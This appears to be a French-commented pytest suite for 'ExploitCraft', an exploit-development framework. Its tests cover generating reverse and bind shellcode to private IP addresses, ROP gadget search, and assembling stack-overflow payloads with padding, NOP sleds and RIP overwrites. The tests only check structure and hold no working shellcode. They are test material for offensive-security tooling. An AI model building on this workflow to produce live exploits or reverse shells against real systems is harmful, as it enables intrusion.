#!/usr/bin/env python3
"""
Tests unitaires pour ExploitCraft
=================================

Suite de tests pour valider le fonctionnement du framework de développement
d'exploits ExploitCraft et ses composants principaux.

Author: Cybersecurity Portfolio
Version: 1.0.0
"""

import pytest
import struct
import tempfile
import os
from unittest.mock import Mock, patch, mock_open

# Import des modules à tester
import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

from exploitcraft import (
    Architecture, Platform, ExploitType,
    Target, Vulnerability, ExploitBuilder, ShellcodeGenerator, ROPChainBuilder
)

class TestArchitectureEnum:
    """Tests pour l'énumération Architecture"""
    
    def test_architecture_values(self):
        """Test des valeurs d'architecture"""
        assert Architecture.X86.value == "i386"
        assert Architecture.X64.value == "amd64" 
        assert Architecture.ARM.value == "arm"
        assert Architecture.ARM64.value == "aarch64"

class TestPlatformEnum:
    """Tests pour l'énumération Platform"""
    
    def test_platform_values(self):
        """Test des valeurs de plateforme"""
        assert Platform.WINDOWS.value == "windows"
        assert Platform.LINUX.value == "linux"
        assert Platform.MACOS.value == "macos"

class TestTarget:
    """Tests pour la classe Target"""
    
    def test_target_creation(self):
        """Test de création d'une cible"""
        target = Target(
            binary_path="/tmp/test_binary",
            architecture=Architecture.X64,
            platform=Platform.LINUX
        )
        
        assert target.binary_path == "/tmp/test_binary"
        assert target.architecture == Architecture.X64
        assert target.platform == Platform.LINUX
        assert target.base_address == 0x400000  # Valeur par défaut
        assert target.aslr_enabled == True
        assert target.dep_enabled == True
        assert target.stack_canary == True
    
    def test_target_custom_settings(self):
        """Test de création d'une cible avec paramètres personnalisés"""
        target = Target(
            binary_path="/tmp/vuln_app",
            architecture=Architecture.X86,
            platform=Platform.WINDOWS,
            base_address=0x401000,
            aslr_enabled=False,
            dep_enabled=False,
            stack_canary=False
        )
        
        assert target.base_address == 0x401000
        assert target.aslr_enabled == False
        assert target.dep_enabled == False
        assert target.stack_canary == False

class TestVulnerability:
    """Tests pour la classe Vulnerability"""
    
    def test_vulnerability_creation(self):
        """Test de création d'une vulnérabilité"""
        vuln = Vulnerability(
            type=ExploitType.STACK_OVERFLOW,
            location="main+0x42",
            offset=146,
            size=8,
            bad_chars=b"\x00\x0a\x0d",
            description="Stack buffer overflow in strcpy"
        )
        
        assert vuln.type == ExploitType.STACK_OVERFLOW
        assert vuln.location == "main+0x42"
        assert vuln.offset == 146
        assert vuln.size == 8
        assert vuln.bad_chars == b"\x00\x0a\x0d"
        assert vuln.description == "Stack buffer overflow in strcpy"

class TestShellcodeGenerator:
    """Tests pour la classe ShellcodeGenerator"""
    
    def test_generator_initialization(self):
        """Test d'initialisation du générateur"""
        gen = ShellcodeGenerator(Architecture.X64, Platform.LINUX)
        assert gen.arch == Architecture.X64
        assert gen.platform == Platform.LINUX
    
    def test_reverse_shell_generation(self):
        """Test de génération de reverse shell"""
        gen = ShellcodeGenerator(Architecture.X64, Platform.LINUX)
        shellcode = gen.generate_reverse_shell("192.168.1.100", 4444)
        
        assert isinstance(shellcode, bytes)
        assert len(shellcode) > 0
        # Vérification que l'IP est intégrée
        # Note: Les tests réels nécessiteraient des shellcodes valides
    
    def test_bind_shell_generation(self):
        """Test de génération de bind shell"""
        gen = ShellcodeGenerator(Architecture.X64, Platform.LINUX)
        shellcode = gen.generate_bind_shell(8080)
        
        assert isinstance(shellcode, bytes)
        assert len(shellcode) > 0
    
    def test_ip_conversion(self):
        """Test de conversion IP en bytes"""
        gen = ShellcodeGenerator(Architecture.X64, Platform.LINUX)
        ip_bytes = gen._ip_to_bytes("192.168.1.100")
        
        assert ip_bytes == b"\xc0\xa8\x01\x64"  # 192.168.1.100 en bytes
    
    def test_invalid_ip_conversion(self):
        """Test de conversion d'IP invalide"""
        gen = ShellcodeGenerator(Architecture.X64, Platform.LINUX)
        ip_bytes = gen._ip_to_bytes("invalid.ip")
        
        assert ip_bytes == b"\x7f\x00\x00\x01"  # localhost par défaut

class TestROPChainBuilder:
    """Tests pour la classe ROPChainBuilder"""
    
    def test_builder_initialization(self):
        """Test d'initialisation du builder ROP"""
        with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
            tmp_file.write(b"\x90" * 100)  # Dummy binary
            tmp_file.flush()
            
            builder = ROPChainBuilder(tmp_file.name)
            assert builder.binary_path == tmp_file.name
            assert isinstance(builder.gadgets, list)
            
            os.unlink(tmp_file.name)
    
    def test_find_gadgets(self):
        """Test de recherche de gadgets"""
        with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
            tmp_file.write(b"\x90" * 100)
            tmp_file.flush()
            
            builder = ROPChainBuilder(tmp_file.name)
            gadgets = builder.find_gadgets()
            
            assert isinstance(gadgets, list)
            # Note: Les tests réels nécessiteraient un binaire avec des gadgets réels
            
            os.unlink(tmp_file.name)
    
    @patch('subprocess.run')
    def test_find_gadgets_with_ropgadget(self, mock_subprocess):
        """Test de recherche avec ROPgadget"""
        mock_result = Mock()
        mock_result.stdout = "0x40123a : pop rdi ; ret\n0x40123b : pop rsi ; ret"
        mock_subprocess.return_value = mock_result
        
        builder = ROPChainBuilder("/tmp/test")
        gadgets = builder.find_gadgets()
        
        assert len(gadgets) >= 0  # Dépend de la sortie simulée

class TestExploitBuilder:
    """Tests pour la classe ExploitBuilder"""
    
    def test_builder_initialization(self):
        """Test d'initialisation du builder d'exploits"""
        builder = ExploitBuilder(ExploitType.STACK_OVERFLOW)
        assert builder.exploit_type == ExploitType.STACK_OVERFLOW
        assert builder.target is None
        assert builder.vulnerability is None
        assert builder.payload_components == []
    
    def test_set_target(self):
        """Test de configuration de la cible"""
        builder = ExploitBuilder()
        target = Target(
            binary_path="/tmp/test",
            architecture=Architecture.X64,
            platform=Platform.LINUX
        )
        
        builder.set_target(target)
        assert builder.target == target
        assert hasattr(builder, 'shellcode_gen')
    
    def test_set_vulnerability(self):
        """Test de configuration de la vulnérabilité"""
        builder = ExploitBuilder()
        vuln = Vulnerability(
            type=ExploitType.STACK_OVERFLOW,
            location="main+0x42",
            offset=146,
            size=8
        )
        
        builder.set_vulnerability(vuln)
        assert builder.vulnerability == vuln
    
    def test_add_overflow(self):
        """Test d'ajout d'overflow"""
        builder = ExploitBuilder()
        target = Target("/tmp/test", Architecture.X64, Platform.LINUX)
        builder.set_target(target)
        
        builder.add_overflow("RIP", 146, 0x4141414141414141)
        
        assert len(builder.payload_components) == 1
        component = builder.payload_components[0]
        assert component['type'] == 'overflow'
        assert component['register'] == 'RIP'
        assert component['offset'] == 146
        assert component['value'] == 0x4141414141414141
    
    def test_add_nop_sled(self):
        """Test d'ajout de NOP sled"""
        builder = ExploitBuilder()
        target = Target("/tmp/test", Architecture.X64, Platform.LINUX)
        builder.set_target(target)
        
        builder.add_nop_sled(100)
        
        assert len(builder.payload_components) == 1
        component = builder.payload_components[0]
        assert component['type'] == 'nop_sled'
        assert component['size'] == 100
        assert component['nops'] == b"\x90" * 100
    
    def test_generate_payload(self):
        """Test de génération de payload"""
        builder = ExploitBuilder()
        
        target = Target("/tmp/test", Architecture.X64, Platform.LINUX)
        vuln = Vulnerability(ExploitType.STACK_OVERFLOW, "main+0x42", 146, 8)
        
        builder.set_target(target)
        builder.set_vulnerability(vuln)
        builder.add_overflow("RIP", 146, 0x4141414141414141)
        
        payload = builder.generate()
        
        assert isinstance(payload, bytes)
        assert len(payload) > 146  # Au moins le padding + overflow
        # Les 146 premiers bytes devraient être 'A'
        assert payload[:146] == b"A" * 146
        # Les 8 suivants devraient être l'adresse de contrôle
        assert payload[146:154] == struct.pack("<Q", 0x4141414141414141)
    
    def test_generate_without_config(self):
        """Test de génération sans configuration complète"""
        builder = ExploitBuilder()
        payload = builder.generate()
        assert payload == b""
    
    def test_save_to_file(self):
        """Test de sauvegarde de payload"""
        builder = ExploitBuilder()
        payload = b"\x90" * 100
        
        with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
            builder.save_to_file(payload, tmp_file.name)
            
            with open(tmp_file.name, 'rb') as f:
                saved_payload = f.read()
            
            assert saved_payload == payload
            os.unlink(tmp_file.name)

class TestIntegration:
    """Tests d'intégration pour le workflow complet"""
    
    def test_complete_exploit_workflow(self):
        """Test du workflow complet de génération d'exploit"""
        # Configuration de la cible
        target = Target(
            binary_path="/tmp/vuln_app",
            architecture=Architecture.X64,
            platform=Platform.LINUX,
            aslr_enabled=False,
            dep_enabled=False
        )
        
        # Configuration de la vulnérabilité
        vuln = Vulnerability(
            type=ExploitType.STACK_OVERFLOW,
            location="main+0x42",
            offset=146,
            size=8,
            bad_chars=b"\x00\x0a\x0d"
        )
        
        # Construction de l'exploit
        builder = ExploitBuilder(ExploitType.STACK_OVERFLOW)
        builder.set_target(target)
        builder.set_vulnerability(vuln)
        
        # Ajout des composants
        builder.add_nop_sled(100)
        builder.add_shellcode("reverse_shell", host="10.0.0.1", port=4444)
        builder.add_overflow("RIP", 146, 0x4141414141414141)
        
        # Génération du payload final
        payload = builder.generate()
        
        assert isinstance(payload, bytes)
        assert len(payload) > 246  # 146 (padding) + 100 (nops) + shellcode
        
        # Vérification de la structure
        assert payload[:146] == b"A" * 146  # Padding initial
    
    def test_shellcode_integration(self):
        """Test d'intégration avec génération de shellcode"""
        target = Target("/tmp/test", Architecture.X64, Platform.LINUX)
        builder = ExploitBuilder()
        builder.set_target(target)
        
        # Test de génération de shellcode reverse
        builder.add_shellcode("reverse_shell", host="192.168.1.100", port=4444)
        
        assert len(builder.payload_components) == 1
        component = builder.payload_components[0]
        assert component['type'] == 'shellcode'
        assert component['shellcode_type'] == 'reverse_shell'
        assert 'shellcode' in component
        assert isinstance(component['shellcode'], bytes)

class TestErrorHandling:
    """Tests de gestion d'erreurs"""
    
    def test_invalid_architecture_combination(self):
        """Test de combinaison architecture/plateforme invalide"""
        # Test avec une architecture non supportée pour certains shellcodes
        gen = ShellcodeGenerator(Architecture.ARM, Platform.WINDOWS)
        shellcode = gen.generate_reverse_shell("127.0.0.1", 4444)
        
        # Devrait retourner un shellcode par défaut ou vide
        assert isinstance(shellcode, bytes)
    
    def test_missing_binary_path(self):
        """Test avec chemin binaire manquant"""
        builder = ExploitBuilder()
        target = Target("", Architecture.X64, Platform.LINUX)
        builder.set_target(target)
        
        # Ne devrait pas planter même avec un chemin vide
        assert builder.target.binary_path == ""
    
    def test_invalid_offset(self):
        """Test avec offset invalide"""
        vuln = Vulnerability(
            type=ExploitType.STACK_OVERFLOW,
            location="main+0x42",
            offset=-1,  # Offset invalide
            size=8
        )
        
        builder = ExploitBuilder()
        target = Target("/tmp/test", Architecture.X64, Platform.LINUX)
        builder.set_target(target)
        builder.set_vulnerability(vuln)
        
        # La génération devrait gérer l'offset négatif
        payload = builder.generate()
        assert isinstance(payload, bytes)

if __name__ == "__main__":
    # Exécution des tests
    pytest.main([__file__, "-v", "--tb=short"])